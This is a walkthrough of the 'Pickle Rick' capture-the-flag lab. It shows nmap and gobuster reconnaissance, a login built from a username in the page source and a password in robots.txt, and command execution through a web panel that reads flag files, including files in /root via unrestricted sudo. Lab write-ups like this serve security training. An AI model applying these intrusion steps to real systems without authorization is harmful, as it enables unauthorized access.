# Pickle Rick CTF Walkthrough

## 1️ Initial Recon with Nmap

First, I performed a search using `nmap`:

```bash
nmap -sV -Pn <matching_ip> -vvv
```

We found **two open ports**: `22` and `80`.

---

## 2️ Directory Enumeration with Gobuster

Next, we checked for directories using `gobuster`:

```bash
gobuster dir -u http://10.113.175.94/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

---

## 3️ Accessing the Website

Open your browser (Firefox or any browser) and enter the IP:

```
http://<matching_ip>/
```

---

## 4️ Inspecting Source Code

To see if there is anything useful in the source code:

- Right-click → **Inspect** or **View Page Source** (Ctrl+U)
- Lines **24 and 28** mention a username

---

## 5️ Accessing the Login Page

From the Gobuster output, we found:

```
login.php
```

Visit:

```
http://<machine_ip>/login.php
```

Make sure to copy the path correctly to **avoid error 500**.

---

## 6️ Analyzing `robots.txt`

The `robots.txt` file was present.

**Info:**

- Developers use `robots.txt` to control search engine indexing.
- It does **not block access**, so a hacker can check hidden paths.

We used the username from the source code and the password from `robots.txt`.

**Result:** BOOM! We are in.

---

## 7️ Command Execution

Once in, we can run Linux commands. Example:

```bash
ls
```

We found a file:

```
Sup3rS3cretPickl3Ingred.txt
```

View its contents:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

First flag found!

---

## 8️⃣ Finding the Second Ingredient

Check for other `.txt` files:

```bash
less clue.txt
```

Navigate around:

```bash
cd /
ls /home
ls /home/rick
```

There was a space in the path, so we can use **escape `\`**:

```bash
less /home/rick/second\ ingredients
```

- Quotes (`" "`) work in terminals but may fail in HTML inputs.

Second flag found!

---

## 9️⃣ Checking User Privileges

Check sudo privileges:

```bash
sudo -l
```

- Shows allowed and disallowed commands.
- In this case, the user can **sudo without limit**.

---

## 10️⃣ Accessing Root Files

Since `ls /root` requires root:

```bash
sudo ls -al /root
```

We found:

```
colad_3rd.txt
```

Retrieve the file contents:

```bash
less /root/colad_3rd.txt
```

Third flag found!
